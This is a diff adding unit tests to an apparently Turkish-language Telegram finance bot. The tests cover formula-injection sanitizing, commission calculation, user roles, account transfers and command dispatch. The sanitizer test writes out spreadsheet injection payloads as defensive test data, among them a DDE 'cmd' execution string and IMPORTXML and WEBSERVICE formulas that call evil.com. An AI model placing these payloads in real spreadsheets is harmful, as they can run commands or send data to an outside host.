@@ -3278,6 +3278,189 @@ class TestSmartCariQueryAndMultiWordMatching(unittest.TestCase):
                         self.assertIn("editMessageText", called_methods, f"{btn} editMessageText çağırmadı for uid {uid}")
                     self.assertIn("answerCallbackQuery", called_methods, f"{btn} answerCallbackQuery çağırmadı for uid {uid}")
 
+    def test_sanitize_sheet_cell_value(self):
+        """Formül ve CSV enjeksiyon korumasını ve meşru formül korumasını test eder."""
+        # 1. Zararlı formül denemeleri metin formatına (' ile) dönüştürülmeli
+        self.assertEqual(bot.sanitize_sheet_cell_value("=cmd|' /C calc'!A0"), "'=cmd|' /C calc'!A0")
+        self.assertEqual(bot.sanitize_sheet_cell_value("=IMPORTXML(\"http://evil.com\")"), "'=IMPORTXML(\"http://evil.com\")")
+        self.assertEqual(bot.sanitize_sheet_cell_value("=WEBSERVICE(\"http://evil.com\")"), "'=WEBSERVICE(\"http://evil.com\")")
+        self.assertEqual(bot.sanitize_sheet_cell_value("+calc"), "'+calc")
+        self.assertEqual(bot.sanitize_sheet_cell_value("-calc"), "'-calc")
+        self.assertEqual(bot.sanitize_sheet_cell_value("@sum(A1)"), "'@sum(A1)")
+
+        # 2. Meşru bot matematik formülleri korunmalı
+        self.assertEqual(bot.sanitize_sheet_cell_value("=1500000"), "=1500000")
+        self.assertEqual(bot.sanitize_sheet_cell_value("=-500000"), "=-500000")
+        self.assertEqual(bot.sanitize_sheet_cell_value("=1500000+2000000"), "=1500000+2000000")
+        self.assertEqual(bot.sanitize_sheet_cell_value("=1500000+2000000-500000"), "=1500000+2000000-500000")
+        self.assertEqual(bot.sanitize_sheet_cell_value("=C5+D5-E5"), "=C5+D5-E5")
+
+        # 3. Sayısal ve güvenli metin değerler aynen kalmalı
+        self.assertEqual(bot.sanitize_sheet_cell_value(150000), 150000)
+        self.assertEqual(bot.sanitize_sheet_cell_value("-500"), "-500")
+        self.assertEqual(bot.sanitize_sheet_cell_value("+100"), "+100")
+        self.assertEqual(bot.sanitize_sheet_cell_value("SACİD TİGER"), "SACİD TİGER")
+
+    def test_komisyon_hesaplayici_impl(self):
+        """Komisyon hesaplayıcı fonksiyonunu test eder."""
+        # Eksik parametre -> rehber dönmeli
+        rehber = bot.komisyon_hesaplayici_impl("/komisyon")
+        self.assertIn("KOMİSYON & KÂR HESAP MAKİNESİ", rehber)
+
+        # Standart hesaplama (100.000 TL, %1.5 komisyon)
+        res1 = bot.komisyon_hesaplayici_impl("/komisyon 100000 1.5")
+        self.assertIn("100.000,00", res1)
+        self.assertIn("1.500,00", res1)
+        self.assertIn("98.500,00", res1)
+
+        # Dövizli hesaplama (5.000 USDT, %2 komisyon, 38.50 kur)
+        res2 = bot.komisyon_hesaplayici_impl("/komisyon 5000 2 38.50")
+        self.assertIn("5.000,00", res2)
+        self.assertIn("Döviz Çevrimi", res2)
+        self.assertIn("188.650,00", res2)
+
+        # Hatalı/negatif tutar
+        res_neg = bot.komisyon_hesaplayici_impl("/komisyon -100 2")
+        self.assertIn("pozitif bir sayı", res_neg)
+
+    def test_kullanici_yetkileri_impl(self):
+        """Yetki ve rol sorgulama kartını farklı roller için test eder."""
+        # Kurucu
+        res_kurucu = bot.kullanici_yetkileri_impl(bot.KURUCU_ID, -100123)
+        self.assertIn("ŞİRKET KURUCUSU", res_kurucu)
+        self.assertIn(str(bot.KURUCU_ID), res_kurucu)
+
+        # Tam yetkili yönetici
+        admin_id = 987654321
+        with patch.dict(bot.app_state, {"EK_ADMINLER": {admin_id}, "ADMIN_CACHE_TIME": bot.time.time() + 3600}):
+            res_admin = bot.kullanici_yetkileri_impl(admin_id, -100123)
+            self.assertIn("TAM YETKİLİ ŞİRKET YÖNETİCİSİ", res_admin)
+
+        # Kısıtlı yetkili
+        kisitli_id = 876543210
+        with patch.dict(bot.app_state, {"KISITLI_YETKILILER": {kisitli_id: {"username": "KisitliTest", "allowed_commands": {"/kasa"}}}}):
+            res_kisitli = bot.kullanici_yetkileri_impl(kisitli_id, -100123)
+            self.assertIn("KISITLI YETKİLİ", res_kisitli)
+            self.assertIn("/kasa", res_kisitli)
+
+        # Standart üye
+        res_standart = bot.kullanici_yetkileri_impl(111222333, -100123)
+        self.assertIn("STANDART GRUP ÜYESİ", res_standart)
+
+    def test_sistem_guvenlik_raporu_impl(self):
+        """Kurucuya özel sistem ve güvenlik raporunu test eder."""
+        # Yetkisiz kullanıcı engellenmeli
+        res_unauth = bot.sistem_guvenlik_raporu_impl(111222333)
+        self.assertIn("Yetkisiz İşlem", res_unauth)
+
+        # Kurucu raporu alabilmeli
+        res_auth = bot.sistem_guvenlik_raporu_impl(bot.KURUCU_ID)
+        self.assertIn("SİBER GÜVENLİK & SİSTEM DENETİMİ", res_auth)
+        self.assertIn("Formül Enjeksiyon Koruması", res_auth)
+        self.assertIn(str(bot.KURUCU_ID), res_auth)
+
+    def test_virman_kasa_aktar_impl_validations(self):
+        """Virman (kasa transferi) doğrulama kontrollerini test eder."""
+        # Eksik parametre -> rehber
+        res_eksik = bot.virman_kasa_aktar_impl("/virman")
+        self.assertIn("CARİLER ARASI KASA VİRMANI", res_eksik)
+
+        # Aynı cari transferi yasak
+        res_ayni = bot.virman_kasa_aktar_impl("/virman SACİD SACİD 50000")
+        self.assertIn("aynı olamaz", res_ayni)
+
+        # Limit aşımı
+        with patch.dict(bot.app_state, {"MAX_TRANSACTION_LIMIT": 100000.0}):
+            res_limit = bot.virman_kasa_aktar_impl("/virman SACİD TİGER 500000")
+            self.assertIn("İşlem Limiti Aşıldı", res_limit)
+
+        # Geçersiz format
+        res_format = bot.virman_kasa_aktar_impl("/virman SACİD TİGER geçersiz")
+        self.assertIn("Hatalı Format", res_format)
+
+        # Başarılı transfer
+        dummy_sheet_data = [
+            ["", "GRUP ADI", "DEVİR", "KASA", "ÖDENEN", "KOMİSYON", "KALAN KASA"],
+            ["1", "SACİD", "0", "100000", "0", "0", "100000"],
+            ["2", "TİGER", "0", "50000", "0", "0", "50000"],
+        ]
+        with patch.object(bot, "get_sheet_values_fast", return_value=dummy_sheet_data), \
+             patch.object(bot, "_kuyruga_sayfa_yazma_ekle") as mock_queue, \
+             patch.object(bot, "update_sheet_matrix_memory"):
+            res_ok = bot.virman_kasa_aktar_impl("/virman SACİD TİGER 20000")
+            self.assertIn("VİRMAN İŞLEMİ BAŞARILI", res_ok)
+            self.assertIn("SACİD", res_ok)
+            self.assertIn("TİGER", res_ok)
+            self.assertIn("20.000,00", res_ok)
+            self.assertEqual(mock_queue.call_count, 2)
+
+    def test_dispatcher_new_and_unrouted_commands(self):
+        """Yeni eklenen ve bağlanan komutların dispatcher üzerinden doğru çalıştığını test eder."""
+        # 1. /komisyon komutu
+        update_komisyon = {
+            "message": {
+                "chat": {"id": -100123, "title": "Finans Grubu"},
+                "from": {"id": bot.KURUCU_ID},
+                "text": "/komisyon 50000 2"
+            }
+        }
+        with patch.object(bot, "telegramMesajGonder") as mock_msg:
+            bot.process_telegram_update(update_komisyon)
+            mock_msg.assert_called()
+            self.assertIn("KOMİSYON HESAPLAMA FİŞİ", mock_msg.call_args[0][1])
+
+        # 2. /yetkiler komutu
+        update_yetkiler = {
+            "message": {
+                "chat": {"id": -100123, "title": "Finans Grubu"},
+                "from": {"id": bot.KURUCU_ID},
+                "text": "/yetkiler"
+            }
+        }
+        with patch.object(bot, "telegramMesajGonder") as mock_msg:
+            bot.process_telegram_update(update_yetkiler)
+            mock_msg.assert_called()
+            self.assertIn("KULLANICI YETKİ VE ROL KARTI", mock_msg.call_args[0][1])
+
+        # 3. /guvenlik komutu
+        update_guvenlik = {
+            "message": {
+                "chat": {"id": -100123, "title": "Finans Grubu"},
+                "from": {"id": bot.KURUCU_ID},
+                "text": "/guvenlik"
+            }
+        }
+        with patch.object(bot, "telegramMesajGonder") as mock_msg:
+            bot.process_telegram_update(update_guvenlik)
+            mock_msg.assert_called()
+            self.assertIn("CFO BOT SİBER GÜVENLİK & SİSTEM DENETİMİ", mock_msg.call_args[0][1])
+
+        # 4. /virman eksik argüman
+        update_virman = {
+            "message": {
+                "chat": {"id": -100123, "title": "Finans Grubu"},
+                "from": {"id": bot.KURUCU_ID},
+                "text": "/virman"
+            }
+        }
+        with patch.object(bot, "telegramMesajGonder") as mock_msg:
+            bot.process_telegram_update(update_virman)
+            mock_msg.assert_called()
+            self.assertIn("CARİLER ARASI KASA VİRMANI", mock_msg.call_args[0][1])
+
+        # 5. /tarih komutu yönlendirmesi
+        update_tarih = {
+            "message": {
+                "chat": {"id": -100123, "title": "Finans Grubu"},
+                "from": {"id": bot.KURUCU_ID},
+                "text": "/tarih 10.09.2026"
+            }
+        }
+        with patch.object(bot, "gecmis_gun_sorgula_impl", return_value="Geçmiş Gün Raporu") as mock_gecmis, \
+             patch.object(bot, "telegramMesajGonder"):
+            bot.process_telegram_update(update_tarih)
+            mock_gecmis.assert_called_once()
+
 if __name__ == "__main__":
     unittest.main()
 
